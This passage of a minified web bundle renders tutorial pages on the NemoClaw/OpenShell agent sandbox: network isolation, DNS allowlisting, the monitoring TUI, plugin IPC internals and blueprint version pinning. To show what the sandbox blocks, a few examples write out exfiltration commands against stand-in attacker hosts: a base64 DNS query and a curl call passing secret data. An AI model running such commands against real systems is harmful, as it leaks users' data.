feature that provides an isolated instance of the network stack. Each network namespace has its own network interfaces, IP addresses, routing tables, firewall rules, and socket ports. Processes in different network namespaces cannot communicate with each other unless explicitly bridged.",example:"The sandbox sees only a 'lo' interface and a 'veth-sandbox' interface. The host's eth0, Wi-Fi, and all other interfaces are invisible.",seeAlso:["veth pair","iptables","DNS resolution","OpenShell Gateway"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Isolation Architecture"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When OpenShell creates a sandbox, it creates a new network namespace and connects it to the host namespace through a veth (virtual Ethernet) pair. The host side of the veth pair is connected to the OpenShell gateway process, which acts as the sole network bridge between the sandbox and the outside world."}),e.jsx(c,{title:"Network Namespace Architecture",components:[{name:"Sandbox Namespace",description:"lo + veth-sandbox",color:"orange"},{name:"veth pair",description:"Virtual ethernet bridge",color:"gray"},{name:"Host Namespace",description:"Full network access",color:"blue"},{name:"OpenShell Gateway",description:"Allowlist enforcer",color:"green"},{name:"Internet",description:"External endpoints",color:"red"}],connections:[{from:"Sandbox Namespace",to:"veth pair",label:"sandbox-side veth"},{from:"veth pair",to:"Host Namespace",label:"host-side veth"},{from:"Host Namespace",to:"OpenShell Gateway",label:"packet filter"},{from:"OpenShell Gateway",to:"Internet",label:"only whitelisted"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"What the Sandbox Sees"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"From inside the sandbox, the network looks very different from the host:"}),e.jsx(t,{title:"Network interfaces inside the sandbox",language:"bash",code:`# Inside the sandbox
$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: veth-sandbox@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.200.0.2/24 scope global veth-sandbox

$ ip route
default via 10.200.0.1 dev veth-sandbox
10.200.0.0/24 dev veth-sandbox proto kernel scope link src 10.200.0.2

# The host's real interfaces are invisible
$ ip addr | grep eth0
# (no output)

$ ip addr | grep wlan0
# (no output)`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The sandbox has a single default route pointing to 10.200.0.1, which is the OpenShell gateway. Every packet leaving the sandbox goes through this gateway, where it is inspected against the network allowlist."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Endpoint Whitelisting"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The OpenShell gateway does not forward all traffic. It maintains an allowlist of endpoints that the sandbox is permitted to contact. Any traffic to an endpoint not on the list is dropped, and the attempt is logged for the operator to review."}),e.jsx(t,{title:"Network allowlist policy",language:"yaml",code:`# .nemoclaw/policies/network.yaml
network:
  # Endpoints the sandbox can reach
  allowlist:
    - host: inference.local
      port: 443
      comment: "LLM inference gateway (always required)"

    - host: pypi.org
      port: 443
      comment: "Python package index (for pip install)"

    - host: files.pythonhosted.org
      port: 443
      comment: "Python package downloads"

    - host: registry.npmjs.org
      port: 443
      comment: "NPM package registry"

    - host: github.com
      port: 443
      comment: "Git operations"

    - host: "*.githubusercontent.com"
      port: 443
      comment: "GitHub raw content and releases"

  # Default action for non-whitelisted traffic
  default: deny

  # Log blocked attempts for operator review
  log_blocked: true`}),e.jsxs(n,{type:"info",title:"inference.local Is Always Allowed",children:["The ",e.jsx("code",{children:"inference.local"})," endpoint is always in the allowlist regardless of policy configuration. This ensures the agent can always reach the LLM inference gateway. Without it, the agent would be unable to function as a coding assistant. This endpoint resolves to the OpenShell gateway itself, so the traffic never leaves the host."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"DNS Resolution Control"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"DNS is a common exfiltration vector -- an attacker can encode data in DNS queries to bypass network restrictions. OpenShell addresses this by running its own DNS resolver inside the sandbox's network namespace. This resolver only resolves hostnames that appear in the network allowlist. All other DNS queries return NXDOMAIN."}),e.jsx(t,{title:"DNS resolution inside the sandbox",language:"bash",code:`# Whitelisted hostname resolves normally
$ dig pypi.org +short
151.101.0.223

# The special inference endpoint resolves to the gateway
$ dig inference.local +short
10.200.0.1

# Non-whitelisted hostname fails
$ dig evil-exfil-server.example.com +short
# (no output -- NXDOMAIN)

# DNS-based exfiltration is blocked
$ dig $(echo "stolen-data" | base64).attacker.com +short
# (no output -- NXDOMAIN)

# Check /etc/resolv.conf -- points to the OpenShell resolver
$ cat /etc/resolv.conf
nameserver 10.200.0.1
# This is the OpenShell gateway acting as a DNS proxy`}),e.jsxs(o,{title:"Wildcard Patterns Require Caution",children:["Network allowlist entries support wildcard patterns (e.g.,"," ",e.jsx("code",{children:"*.githubusercontent.com"}),"). Use wildcards sparingly -- a pattern like ",e.jsx("code",{children:"*.com"})," would effectively disable network isolation. Each wildcard entry should be as specific as possible. NemoClaw will warn if a wildcard pattern is overly broad."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Blocked Request Logging"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When the gateway blocks a network request, it logs the attempt with full details: timestamp, source process, destination host and port, and the matching rule (or lack thereof). These logs are visible in the OpenShell TUI and can be reviewed by the operator to decide whether to update the allowlist."}),e.jsx(t,{title:"Blocked request log entries",language:"bash",code:`$ openshell term --view=network
Network Activity Log:
  14:23:01  ALLOW  python3 -> pypi.org:443 (rule: pypi.org)
  14:23:02  ALLOW  python3 -> files.pythonhosted.org:443 (rule: files.pythonhosted.org)
  14:23:15  BLOCK  python3 -> api.openai.com:443 (no matching rule)
  14:23:15  BLOCK  curl -> 203.0.113.50:8080 (no matching rule)
  14:23:22  ALLOW  git -> github.com:443 (rule: github.com)

Blocked requests: 2 (review with 'openshell approve')`}),e.jsx(n,{type:"tip",title:"Operator Approval Queue",children:"Blocked network requests are added to an approval queue visible in the TUI. The operator can review each blocked request and, if appropriate, add the endpoint to the allowlist with a single keypress. This makes it easy to iteratively refine network policies without editing YAML files manually."}),e.jsx(r,{question:"An agent inside the sandbox runs 'curl https://attacker.com/exfil?data=secret'. What happens?",options:["The request succeeds because curl is an allowed binary","DNS resolution for attacker.com fails (NXDOMAIN) because it is not in the allowlist, and even if the IP were hardcoded, the gateway would drop the packet","The request is redirected to inference.local","OpenShell modifies the response to remove sensitive data"],correctIndex:1,explanation:"Two layers block this attack. First, the OpenShell DNS resolver returns NXDOMAIN for attacker.com because it is not in the allowlist. Second, even if the attacker hardcodes an IP address, the gateway inspects outbound connections and drops any traffic to endpoints not on the allowlist. Both the DNS query and the direct connection attempt are logged for operator review."}),e.jsx(s,{references:[{title:"Linux Network Namespaces",url:"https://man7.org/linux/man-pages/man7/network_namespaces.7.html",type:"docs",description:"Linux man page for network namespaces."},{title:"OpenShell Network Isolation",url:"https://docs.nvidia.com/openshell/networking",type:"docs",description:"Configuring network allowlists and DNS resolution in OpenShell."}]})]})}const G=Object.freeze(Object.defineProperty({__proto__:null,default:f},Symbol.toStringTag,{value:"Module"}));function b(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"The OpenShell TUI"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["OpenShell includes a terminal user interface (TUI) that provides real-time visibility into sandbox activity. Accessed via the"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"openshell term"})," command, the TUI is your window into what the agent is doing, what it is being blocked from doing, and whether the sandbox is healthy. For operators who need to monitor autonomous agents, the TUI is an essential tool."]}),e.jsx(a,{term:"openshell term",definition:"The terminal-based monitoring interface for OpenShell sandboxes. It displays real-time information about sandbox health, network activity, blocked requests, filesystem access attempts, and the operator approval queue. It runs in any terminal emulator and uses a curses-based layout.",example:"openshell term --sandbox my-agent-sandbox",seeAlso:["Operator Approval","Network Allowlist","Sandbox Health"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Launching the TUI"}),e.jsx(t,{title:"Starting the TUI",language:"bash",code:`# Open the TUI for the current/default sandbox
$ openshell term

# Open for a specific named sandbox
$ openshell term --sandbox my-project-sandbox

# Open with a specific view focused
$ openshell term --view=network

# Open in read-only mode (no approval actions)
$ openshell term --readonly`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"TUI Layout and Views"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The TUI is organized into several views that you can switch between using keyboard shortcuts. Each view focuses on a different aspect of sandbox monitoring:"}),e.jsx(i,{title:"TUI Views",headers:["View","Shortcut","Shows"],rows:[["Overview","1","Sandbox health summary, uptime, resource usage, policy status"],["Network","2","Real-time network activity log, blocked requests, allowlist status"],["Filesystem","3","Filesystem access attempts, Landlock denials, path access patterns"],["Syscalls","4","Seccomp filter activity, denied syscalls, kill events"],["Approval Queue","5","Pending operator approval requests for blocked actions"],["Inference","6","Inference request log, latency, token usage, provider status"]]}),e.jsx(t,{title:"TUI Overview screen (text representation)",language:"bash",code:`┌─ OpenShell TUI ──────────────────────────────────────────────┐
│ Sandbox: my-project-sandbox          Status: RUNNING        │
│ Blueprint: v0.8.2 (verified)         Uptime: 1h 23m        │
├──────────────────────────────────────────────────────────────┤
│ SECURITY STATUS                                              │
│   Landlock:  Enforcing (12 rules)             [OK]          │
│   Seccomp:   Enforcing (58/342 allowed)       [OK]          │
│   Network:   Isolated (5 endpoints allowed)   [OK]          │
│   Inference:  Connected (142ms latency)        [OK]          │
├──────────────────────────────────────────────────────────────┤
│ ACTIVITY (last 5 minutes)                                    │
│   Network requests:   47 allowed, 3 blocked                 │
│   Filesystem ops:     1,284 allowed, 12 denied              │
│   Inference calls:    8 (avg 312ms, 4.2k tokens)            │
│   Seccomp denials:    0                                      │
├──────────────────────────────────────────────────────────────┤
│ APPROVAL QUEUE: 2 pending                                    │
│   [!] python3 wants to reach api.openai.com:443             │
│   [!] npm wants to reach registry.yarnpkg.com:443           │
├──────────────────────────────────────────────────────────────┤
│ [1]Overview [2]Network [3]FS [4]Syscalls [5]Queue [6]Infer  │
│ [a]Approve  [d]Deny    [r]Refresh       [q]Quit             │
└──────────────────────────────────────────────────────────────┘`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Monitoring Blocked Requests"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The Network view shows a real-time log of all network activity, with blocked requests highlighted. This is invaluable when an agent is not working as expected -- often the problem is a missing endpoint in the network allowlist."}),e.jsx(t,{title:"Network view detail",language:"bash",code:`┌─ Network Activity ───────────────────────────────────────────┐
│ Filter: [all ▾]   Sort: [time ▾]   Auto-scroll: [on]       │
├──────────────────────────────────────────────────────────────┤
│ 14:23:01  ALLOW  python3    -> pypi.org:443          [pip]  │
│ 14:23:02  ALLOW  python3    -> files.pythonhosted.org:443   │
│ 14:23:08  ALLOW  git        -> github.com:443        [git]  │
│ 14:23:15  BLOCK  python3    -> api.openai.com:443    [!!!]  │
│ 14:23:22  ALLOW  python3    -> inference.local:443   [llm]  │
│ 14:23:30  BLOCK  curl       -> 203.0.113.50:8080    [!!!]  │
│ 14:23:45  ALLOW  python3    -> registry.npmjs.org:443       │
├──────────────────────────────────────────────────────────────┤
│ Totals: 47 allowed, 3 blocked (since sandbox start)         │
│ Press [Enter] on a blocked request to see details           │
└──────────────────────────────────────────────────────────────┘`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Operator Approval Queue"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"When the agent attempts an action that is blocked by policy, the request can optionally be added to an approval queue instead of being silently dropped. The operator can then review the request in the TUI and decide whether to approve (temporarily allow) or deny it."}),e.jsx(l,{title:"Approving a Blocked Request",steps:[{title:"Navigate to the Approval Queue",content:"Press [5] or navigate to the Approval Queue view. You will see a list of pending requests with details about what was blocked and why."},{title:"Review the request",content:"Select a request with arrow keys and press [Enter] to see full details: the requesting process, the destination, the policy rule that blocked it, and the agent's stated reason (if available)."},{title:"Approve or deny",content:"Press [a] to approve (adds a temporary allowlist entry for this session) or [d] to deny (the request stays blocked). You can also press [p] to add the endpoint permanently to the policy file."},{title:"Agent retries automatically",content:"If approved, the agent's next attempt to reach the endpoint will succeed. Most agents retry blocked requests automatically, so the approval takes effect without manual intervention."}]}),e.jsx(t,{title:"Approval queue detail view",language:"bash",code:`┌─ Approval Request Detail ────────────────────────────────────┐
│                                                              │
│ Request #1                        Status: PENDING            │
│                                                              │
│ Process:     python3 (pid 4832)                              │
│ Destination: api.openai.com:443                              │
│ Protocol:    HTTPS                                           │
│ Blocked by:  network.allowlist (no matching rule)            │
│ First seen:  14:23:15                                        │
│ Attempts:    3                                               │
│                                                              │
│ Agent context (if available):                                │
│   "Attempting to call OpenAI API for code completion"        │
│                                                              │
│ [a] Approve (session)  [p] Approve (permanent)  [d] Deny    │
│ [b] Back to queue                                            │
└──────────────────────────────────────────────────────────────┘`}),e.jsx(n,{type:"tip",title:"Session vs. Permanent Approval",children:"A session approval lasts only until the sandbox is destroyed. It is useful for one-off needs. A permanent approval modifies the policy YAML file on disk, making the change persist across sandbox restarts. Use permanent approval when you know the endpoint will be needed regularly."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Keyboard Shortcuts"}),e.jsx(i,{title:"TUI Keyboard Shortcuts",headers:["Key","Action"],rows:[["1-6","Switch to numbered view"],["Tab","Cycle through views"],["Arrow keys","Navigate within a view"],["Enter","Show detail for selected item"],["a","Approve selected item in queue"],["d","Deny selected item in queue"],["p","Permanently approve (adds to policy file)"],["r","Refresh current view"],["/","Filter/search within current view"],["f","Toggle auto-follow (auto-scroll to newest)"],["q","Quit TUI"]]}),e.jsxs(n,{type:"info",title:"Running Alongside the Editor",children:["The TUI runs in a separate terminal window alongside OpenClaw. A common setup is to have OpenClaw in one terminal (or GUI window) and"," ",e.jsx("code",{children:"openshell term"})," in a side panel or second monitor. This gives you full visibility into sandbox activity while the agent works. For tmux or screen users, a vertical split works well."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Sandbox Status Monitoring"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The Overview screen continuously monitors sandbox health. If any security enforcement degrades (which should not happen under normal operation), the status indicator changes from OK to WARN or FAIL. The TUI can also be configured to send notifications (desktop notifications or webhook) when the status changes."}),e.jsx(t,{title:"Configuring TUI notifications",language:"yaml",code:`# .nemoclaw/config.yaml
tui:
  notifications:
    # Desktop notification on status change
    desktop: true

    # Webhook on critical events
    webhook:
      url: "https://hooks.slack.com/services/T.../B.../xxx"
      events:
        - sandbox.status.degraded
        - sandbox.status.failed
        - approval.queue.new`}),e.jsx(s,{references:[{title:"OpenShell TUI Guide",url:"https://docs.nvidia.com/openshell/tui",type:"docs",description:"Complete guide to the OpenShell terminal user interface."},{title:"Operator Approval Workflow",url:"https://docs.nvidia.com/nemoclaw/operator-approval",type:"docs",description:"How operator approval works for blocked agent actions."}]})]})}const V=Object.freeze(Object.defineProperty({__proto__:null,default:b},Symbol.toStringTag,{value:"Module"}));function w(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Plugin Internals"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The NemoClaw TypeScript plugin is the thinnest possible integration between OpenClaw and the NemoClaw blueprint. It lives inside OpenClaw's extension host and exists to do exactly three things: register an inference provider, add the",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/nemoclaw"})," slash command, and relay messages over IPC. This section examines how each of these pieces works internally."]}),e.jsx(c,{title:"Plugin Internal Architecture",components:[{name:"OpenClaw Extension Host",description:"Runs all extensions",color:"blue"},{name:"NemoClaw Plugin",description:"~200 lines TypeScript",color:"green"},{name:"Inference Provider",description:"Registered LM provider",color:"purple"},{name:"Slash Command",description:"/nemoclaw command handler",color:"orange"},{name:"IPC Channel",description:"JSON-RPC to blueprint",color:"gray"}],connections:[{from:"OpenClaw Extension Host",to:"NemoClaw Plugin",label:"activate()"},{from:"NemoClaw Plugin",to:"Inference Provider",label:"registers"},{from:"NemoClaw Plugin",to:"Slash Command",label:"registers"},{from:"Inference Provider",to:"IPC Channel",label:"forwards requests"},{from:"Slash Command",to:"IPC Channel",label:"forwards commands"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Inference Provider Registration"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["When OpenClaw loads the NemoClaw plugin, the plugin's"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"activate()"})," function runs. The first thing it does is register a chat model provider with OpenClaw's language model API. This tells OpenClaw that NemoClaw can handle inference requests."]}),e.jsx(t,{title:"Inference provider registration",language:"javascript",code:`// src/extension.ts (simplified)
import * as openclaw from 'openclaw';
import { BlueprintIPC } from './ipc';

class NemoClawProvider implements openclaw.ChatModelProvider {
  private ipc: BlueprintIPC;

  constructor(ipc: BlueprintIPC) {
    this.ipc = ipc;
  }

  // Called by OpenClaw when a completion is requested
  async provideChatResponse(
    messages: openclaw.ChatMessage[],
    options: openclaw.ChatModelOptions,
    token: openclaw.CancellationToken
  ): Promise<openclaw.ChatModelResponse> {
    // Forward the entire request to the blueprint over IPC
    const result = await this.ipc.call('inference.complete', {
      messages: messages.map(m => ({
        role: m.role,
        content: m.content,
      })),
      model: options.model,
      temperature: options.temperature,
    });

    return {
      content: result.content,
      usage: result.usage,
    };
  }
}

export function activate(context: openclaw.ExtensionContext) {
  const ipc = new BlueprintIPC();

  // Register inference provider
  const provider = new NemoClawProvider(ipc);
  context.subscriptions.push(
    openclaw.lm.registerChatModelProvider('nemoclaw', provider)
  );
}`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Notice that the provider class contains zero inference logic. It does not know which LLM is configured, does not hold API credentials, and does not parse the response. It is a pure pass-through. The blueprint handles all of those concerns."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Slash Command Handler"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The second registration is the"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/nemoclaw"})," slash command. This gives users a way to interact with NemoClaw directly from the OpenClaw command input. The slash command supports subcommands like"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"status"}),","," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"apply"}),","," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"plan"}),", and"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"config"}),"."]}),e.jsx(t,{title:"Slash command registration",language:"javascript",code:`// Continuing from activate()

function handleSlashCommand(args: string): string {
  const [subcommand, ...rest] = args.trim().split(/\\s+/);

  switch (subcommand) {
    case 'status':
      return ipc.call('status', {});
    case 'apply':
      return ipc.call('apply', { args: rest });
    case 'plan':
      return ipc.call('plan', { args: rest });
    case 'config':
      return ipc.call('config', { args: rest });
    default:
      return \`Unknown subcommand: \${subcommand}. \\
Try: status, apply, plan, config\`;
  }
}

// Register the slash command
context.subscriptions.push(
  openclaw.commands.registerCommand(
    'nemoclaw.slash',
    handleSlashCommand
  )
);`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"IPC Communication"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The plugin communicates with the blueprint over a Unix domain socket using JSON-RPC 2.0. The IPC layer is the most complex part of the plugin, but even so it is under 80 lines of code. It handles connection management, request/ response correlation, and timeout handling."}),e.jsx(t,{title:"IPC client (simplified)",language:"javascript",code:`// src/ipc.ts (simplified)
import { connect } from 'net';

export class BlueprintIPC {
  private socket: net.Socket;
  private pending = new Map<number, { resolve, reject }>();
  private nextId = 1;

  constructor() {
    const socketPath = process.env.NEMOCLAW_SOCKET
      ?? '/run/nemoclaw/blueprint.sock';
    this.socket = connect(socketPath);
    this.socket.on('data', (data) => this.handleResponse(data));
  }

  async call(method: string, params: any): Promise<any> {
    const id = this.nextId++;
    const request = {
      jsonrpc: '2.0',
      method,
      params,
      id,
    };

    return new Promise((resolve, reject) => {
      this.pending.set(id, { resolve, reject });
      this.socket.write(JSON.stringify(request) + '\\n');

      // Timeout after 30s
      setTimeout(() => {
        if (this.pending.has(id)) {
          this.pending.delete(id);
          reject(new Error(\`IPC timeout for \${method}\`));
        }
      }, 30000);
    });
  }

  private handleResponse(data: Buffer) {
    const response = JSON.parse(data.toString());
    const pending = this.pending.get(response.id);
    if (pending) {
      this.pending.delete(response.id);
      if (response.error) {
        pending.reject(new Error(response.error.message));
      } else {
        pending.resolve(response.result);
      }
    }
  }
}`}),e.jsx(n,{type:"info",title:"Why Unix Domain Sockets?",children:"The IPC uses Unix domain sockets rather than TCP because they are local-only by nature (no network exposure), support file-based permissions (the socket file is readable only by the current user), and have lower overhead than TCP for local communication. The socket file is created by the blueprint process when it starts."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"What the Plugin Does NOT Do"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Understanding the plugin's boundaries is as important as understanding its functions. The plugin explicitly does not:"}),e.jsx(i,{title:"Plugin Boundaries",headers:["Concern","Plugin Does This?","Who Does?"],rows:[["Hold API credentials","No","Blueprint (host-side)"],["Parse policy files","No","Blueprint"],["Manage sandbox lifecycle","No","Blueprint + OpenShell"],["Verify blueprint digests","No","Blueprint self-verification"],["Route inference requests","No (just forwards)","Blueprint"],["Handle errors from LLM","No (just relays)","Blueprint"],["Cache completions","No","Blueprint (optional)"],["Show UI elements","Minimal (status bar)","TUI / OpenClaw native"]]}),e.jsx(r,{question:"What would happen if the blueprint process is not running when the plugin tries to send an IPC message?",options:["The plugin crashes and takes down OpenClaw","The IPC connection fails, and the plugin returns a user-friendly error indicating the blueprint is not running","The message is queued and delivered when the blueprint starts","The plugin automatically starts the blueprint process"],correctIndex:1,explanation:"The plugin handles IPC failures gracefully. If the blueprint is not running, the Unix domain socket connection will fail, and the plugin will return an error message to OpenClaw suggesting the user run 'nemoclaw apply' or check the blueprint status. The plugin does not attempt to start the blueprint -- that is the user's or system's responsibility."}),e.jsx(s,{references:[{title:"NemoClaw Plugin Source",url:"https://github.com/NVIDIA/NemoClaw/tree/main/plugin",type:"github",description:"TypeScript source code for the NemoClaw OpenClaw plugin."},{title:"OpenClaw Extension API",url:"https://docs.openclaw.dev/api/extensions",type:"docs",description:"API reference for OpenClaw extension development."}]})]})}const U=Object.freeze(Object.defineProperty({__proto__:null,default:w},Symbol.toStringTag,{value:"Module"}));function v(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Blueprint Versioning"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw blueprints follow semantic versioning (semver) and have an independent release cadence from the TypeScript plugin. This means the complex orchestration logic can be updated -- with new features, security patches, and provider support -- without requiring users to update their OpenClaw extension, restart their editor, or wait for marketplace approval."}),e.jsx(a,{term:"Semantic Versioning (semver)",definition:"A versioning scheme in the format MAJOR.MINOR.PATCH where: MAJOR indicates breaking changes to policy format or behavior, MINOR adds new features in a backwards-compatible way, and PATCH contains backwards-compatible bug fixes and security patches.",example:"Blueprint 0.8.2 -> 0.8.3 (patch: security fix), 0.8.2 -> 0.9.0 (minor: new provider support), 0.8.2 -> 1.0.0 (major: policy format v2).",seeAlso:["Immutable Release","Version Pinning","Digest Verification"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Independent Release Cadence"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The plugin and blueprint are released independently. In practice, the plugin changes rarely (a few times per year when OpenClaw's extension API changes), while the blueprint may release weekly or even more frequently."}),e.jsx(i,{title:"Release Cadence Comparison",headers:["Component","Typical Release Frequency","Triggers for Release"],rows:[["TypeScript Plugin","Quarterly","OpenClaw API changes, major UX improvements"],["Python Blueprint","Weekly to biweekly","New provider support, security patches, policy features, bug fixes"]]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This independence is possible because the IPC interface between plugin and blueprint is stable and versioned separately. The blueprint can add new features (new IPC methods, new policy types) without changing the plugin, as long as it remains backwards-compatible with the existing IPC methods the plugin uses."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Version Pinning"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"By default, NemoClaw uses the latest compatible blueprint version. For production environments and teams that need reproducibility, you can pin to an exact version or a version range in your project configuration."}),e.jsx(t,{title:"Version pinning strategies",language:"yaml",code:`# .nemoclaw/config.yaml

# Strategy 1: Exact pin (most predictable)
blueprint:
  version: "0.8.2"
  # Always uses exactly 0.8.2, even if 0.8.3 is available

# Strategy 2: Patch range (recommended for most teams)
blueprint:
  version: "~0.8.2"
  # Allows 0.8.2, 0.8.3, 0.8.4, etc. but NOT 0.9.0
  # Equivalent to: >=0.8.2 <0.9.0

# Strategy 3: Minor range (for teams that want new features quickly)
blueprint:
  version: "^0.8.2"
  # Allows 0.8.x and 0.9.x, but NOT 1.0.0
  # Equivalent to: >=0.8.2 <1.0.0

# Strategy 4: Latest (default, not recommended for production)
blueprint:
  version: "latest"
  # Always uses the newest published version`}),e.jsxs(n,{type:"tip",title:"Recommendation: Use Patch Pinning",children:["For most teams, the tilde (",e.jsx("code",{children:"~"}),") version constraint is the sweet spot. You get security patches automatically, but you do not get new features until you deliberately upgrade. New features (minor versions) occasionally change behavior in subtle ways, and you want to test those changes before deploying them across your team."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Upgrade Strategy"}),e.jsx(l,{title:"Upgrading the Blueprint",steps:[{title:"Check available versions",content:"List available blueprint versions and their changelogs to understand what has changed.",code:`$ nemoclaw blueprint list
Available blueprints:
  0.8.4  (2025-12-01)  Security: fix seccomp filter for io_uring
  0.8.3  (2025-11-20)  Fix: Landlock rule ordering for nested paths
  0.8.2  (2025-11-15)  Current (pinned)
  0.8.1  (2025-11-01)  Fix: inference timeout handling
  0.8.0  (2025-10-15)  Feature: Google Gemini provider support`,language:"bash"},{title:"Review the changelog",content:"Read the changelog for the versions between your current and target version. Pay special attention to breaking changes and policy format changes.",code:`$ nemoclaw blueprint changelog 0.8.2..0.8.4
## 0.8.4 (2025-12-01)
- SECURITY: Block io_uring syscalls in default seccomp profile
- Fix: Improve error messages for Landlock ABI version mismatch

## 0.8.3 (2025-11-20)
- Fix: Landlock rules for nested paths now apply in correct order
- Fix: DNS resolver handles CNAME chains properly`,language:"bash"},{title:"Test with plan (dry run)",content:"Run a plan with the new version without applying it. This shows what would change in your sandbox configuration.",code:`$ nemoclaw plan --blueprint-version 0.8.4
Planning with blueprint v0.8.4 (current: v0.8.2)...
Changes:
  + seccomp: block io_uring_setup, io_uring_enter, io_uring_register
  ~ landlock: reorder rules for /sandbox/node_modules (nested path fix)
  No policy format changes required.`,language:"bash"},{title:"Update the pin and apply",content:"Update your config file with the new version and apply the change.",code:`# Update .nemoclaw/config.yaml
blueprint:
  version: "~0.8.4"

# Apply the update
$ nemoclaw apply
Resolving blueprint... v0.8.4 (new)
Fetching from registry... done
Verifying integrity... PASS
Applying changes... done
Blueprint upgraded: 0.8.2 -> 0.8.4`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Version Pinning with Digest"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"For maximum security, you can pin both the version number and the expected digest. This provides two independent checks: the version must match and the content must match. Even if the registry were compromised and a malicious package uploaded under the correct version number, the digest check would catch it."}),e.jsx(t,{title:"Version + digest pinning",language:"yaml",code:`# .nemoclaw/config.yaml -- maximum security configuration
blueprint:
  version: "0.8.4"
  digest: "sha256:b4c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6"
  registry: "https://registry.nvidia.com/nemoclaw"

  # If either version or digest does not match, apply fails
  # This is recommended for:
  #   - Production CI/CD pipelines
  #   - Regulated environments (SOC2, HIPAA)
  #   - Multi-team organizations where consistency is critical`}),e.jsxs(o,{title:"Commit Your Config File",children:["The ",e.jsx("code",{children:".nemoclaw/config.yaml"}),` file, including the version pin, should be committed to your project's version control. This ensures that every team member and CI runner uses the same blueprint version. A common source of "works on my machine" issues is different team members running different blueprint versions.`]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Automatic Security Updates"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw can optionally notify you when a security patch is available for your pinned version. This uses the blueprint registry's advisory feed:"}),e.jsx(t,{title:"Security advisory notifications",language:"yaml",code:`# .nemoclaw/config.yaml
blueprint:
  version: "~0.8.2"
  security:
    # Notify when a security patch is available
    notify_on_advisory: true
